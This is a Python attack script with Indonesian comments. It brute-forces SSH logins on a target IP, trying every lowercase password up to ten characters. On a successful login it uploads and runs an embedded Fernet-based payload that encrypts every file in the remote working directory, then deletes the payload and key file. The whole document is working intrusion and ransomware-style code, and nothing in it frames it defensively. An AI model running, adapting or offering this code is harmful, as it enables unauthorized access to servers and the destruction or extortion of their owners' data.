#SEBELUM RUN JALANI PERINTAH INI DI TERMINAL UNTUK MENGINSTALL paramiko
#pip install paramiko

import paramiko
import string
import itertools

# Python code to be executed on the VM
python_code = """
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "decrypt.py" or file == "secretkey":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()
print(key)

with open("secretkey", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
"""


# Informasi SSH untuk masuk ke server target
ssh_host = str(input("IP Target: "))
ssh_port = int(input("Port Target: "))

# Informasi target user
target_user = str(input("Username of The Target: "))
ssh_username = target_user  # Gunakan target_user sebagai username

vm_ip = ssh_host
vm_username = target_user


attempts = 0  # Counter for keeping track of attempts
tried_passwords = set()  # Set to store passwords that have been tried

# Function to generate passwords in sequence (1 digit to 10 digits, then aa, ab, ac, ...)
def generate_password_sequence():
    for length in range(1, 11):  # Generate passwords from 1 digit to 10 digits
        for combination in itertools.product(string.ascii_lowercase, repeat=length):
            yield ''.join(combination)

try:
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    password_generator = generate_password_sequence()

    while True:
        password = next(password_generator)  # Get the next password in the sequence
        if password in tried_passwords:
            continue

        try:
            ssh_client.connect(ssh_host, ssh_port, ssh_username, password)
            # Jika koneksi berhasil, password yang valid ditemukan
            print("[>] Valid password found: '{}'!".format(password))
            
            ssh_client.connect(vm_ip, username=vm_username, password=password)

            with ssh_client.open_sftp().file("/tmp/code.py", 'w') as remote_file:
                remote_file.write(python_code)

            stdin, stdout, stderr = ssh_client.exec_command("dnf install pip python3 -y")
            print(stdout.read().decode())

            stdin, stdout, stderr = ssh_client.exec_command("pip install cryptography")
            print(stdout.read().decode())

            stdin, stdout, stderr = ssh_client.exec_command("python3 /tmp/code.py")
            secretkey=str(stdout.read().decode())
            print("key= ",secretkey)

            stdin, stdout, stderr = ssh_client.exec_command("rm -rf /tmp/code.py secretkey")
            print(stdout.read().decode())
            break
            
        except paramiko.ssh_exception.AuthenticationException:
            # Jika gagal login, lanjutkan mencoba password lainnya
            ssh_client.close()  # Close the SSH session
            pass

        except Exception as e:
            print("Error:", str(e))

        finally:
            # Close the SSH connection
            ssh_client.close()

        attempts += 1
        print("[{}] Attempting password: '{}'".format(attempts, password))
        tried_passwords.add(password)  # Add the tried password to the set

except paramiko.ssh_exception.AuthenticationException:
    print("[-] SSH authentication to the target user failed!")

finally:
    ssh_client.close()
